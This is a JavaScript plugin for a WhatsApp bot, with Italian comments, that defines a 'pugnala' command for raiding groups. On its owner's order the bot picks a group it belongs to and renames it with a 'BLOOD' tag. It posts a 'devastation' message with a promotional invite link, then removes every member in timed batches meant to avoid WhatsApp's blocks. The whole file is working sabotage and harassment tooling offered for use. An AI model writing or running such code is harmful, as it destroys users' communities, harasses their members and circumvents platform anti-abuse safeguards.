let handler = async (m, { conn, text, command }) => {
    // 1. Controllo Owner (Sicurezza)
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    try {
        // 2. Logica Chat Privata (Lista Gruppi)
        if (!m.isGroup) {
            let groups;
            try {
                groups = Object.values(await conn.groupFetchAllParticipating());
            } catch (e) {
                return m.reply("❌ Errore nel recupero dei gruppi. Riprova tra poco.");
            }

            if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

            // Se non c'è testo, mostra la lista
            if (!text) {
                let txt = "🩸 *Scegli il numero del gruppo da svuotare:*\n\n";
                groups.forEach((g, i) => {
                    txt += `*${i + 1}.* ${g.subject}\n`;
                });
                txt += `\n👉 Scrivi: *.${command} [numero]*`;
                return m.reply(txt);
            }

            // Selezione del gruppo
            let index = parseInt(text) - 1;
            if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido. Scegli un numero della lista.");
            
            var targetChat = groups[index].id;
            var targetName = groups[index].subject;
            await m.reply(`⚔️ Avvio attacco su: *${targetName}*...`);
        } else {
            // Logica se usato direttamente nel gruppo
            var targetChat = m.chat;
        }

        // 3. ESECUZIONE AZIONI SUL GRUPPO TARGET
        const botId = conn.user.id.includes(':') ? conn.user.id.split(':')[0] + '@s.whatsapp.net' : conn.user.id;
        
        // Prendiamo i metadati (fondamentale per i partecipanti)
        let metadata = await conn.groupMetadata(targetChat).catch(() => null);
        if (!metadata) return m.reply("❌ Impossibile accedere al gruppo. Il bot è ancora dentro?");

        // A. Cambio Nome
        await conn.groupUpdateSubject(targetChat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // B. Messaggi di Devastazione
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri"
        });

        // C. Rimozione Membri (Solo se il bot è admin)
        let usersToRemove = metadata.participants
            .filter(p => p.id !== botId && !ownerJids.includes(p.id))
            .map(p => p.id);

        if (usersToRemove.length > 0) {
            // Rimuoviamo a blocchi di 5 per non essere bloccati da WA
            for (let i = 0; i < usersToRemove.length; i += 5) {
                let chunk = usersToRemove.slice(i, i + 5);
                await conn.groupParticipantsUpdate(targetChat, chunk, 'remove').catch(() => {});
                await new Promise(res => setTimeout(res, 1000)); // 1 secondo di pausa
            }
        }

        if (!m.isGroup) m.reply(`✅ Operazione su *${metadata.subject}* completata.`);

    } catch (err) {
        console.error(err);
        m.reply("❌ Errore imprevisto nello script.");
    }
};

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
